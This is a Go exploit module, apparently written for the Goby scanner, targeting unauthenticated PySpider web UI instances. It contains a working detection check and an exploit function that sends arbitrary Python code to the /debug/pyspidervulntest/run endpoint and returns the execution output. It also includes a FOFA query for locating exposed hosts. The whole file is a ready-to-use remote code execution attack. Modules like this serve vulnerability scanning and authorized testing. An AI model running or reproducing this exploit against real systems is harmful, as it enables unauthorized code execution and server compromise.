package exploits

import (
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "PySpider Unauthorized Access RCE",
    "Description": "PySpider Unauthorized Access lead to arbitrary python code execution",
    "Product": "PySpider",
    "Homepage": "https://github.com/binux/pyspider",
    "DisclosureDate": "2021-05-18",
    "Author": "ovi3",
    "FofaQuery": "app=\"pyspider\"",
    "Level": "3",
    "Impact": "Allows remote attackers to execute arbitrary python code",
    "Recommendation": "Add pyspider webui authorization. see https://github.com/binux/pyspider/issues/62",
    "References": [
        "https://github.com/ianxtianxt/Pyspider-webui-poc"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "pythonCode",
            "type": "input",
            "value": "print(\"python\")"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": null,
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10193"
}`
	execCode := func(u *httpclient.FixUrl, pyCode string) (string, error) {
		cfg := httpclient.NewPostRequestConfig("/debug/pyspidervulntest/run")
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		pyCode = url.QueryEscape(pyCode)
		cfg.Data = `webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++` + pyCode + `&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D`
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody, nil
		} else {
			return "", err
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand.Seed(time.Now().UnixNano())
			rand1 := 80000000 + rand.Intn(8000000)
			rand2 := 80000000 + rand.Intn(8000000)
			cmd := fmt.Sprintf(`print(str(%d+%d))`, rand1, rand2)
			if content, err := execCode(u, cmd); err == nil {
				if strings.Contains(content, fmt.Sprintf(`%d`, rand1+rand2)) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if content, err := execCode(expResult.HostInfo, ss.Params["pythonCode"].(string)); err == nil {
				if m := regexp.MustCompile(`"logs": (".*?"), "messages"`).FindStringSubmatch(content); m != nil {
					var output string
					err := json.Unmarshal([]byte(m[1]), &output)
					if err == nil {
						expResult.Success = true
						expResult.Output = output
						return expResult
					}
				}

				expResult.Success = true
				expResult.Output = content
			}
			return expResult
		},
	))
}
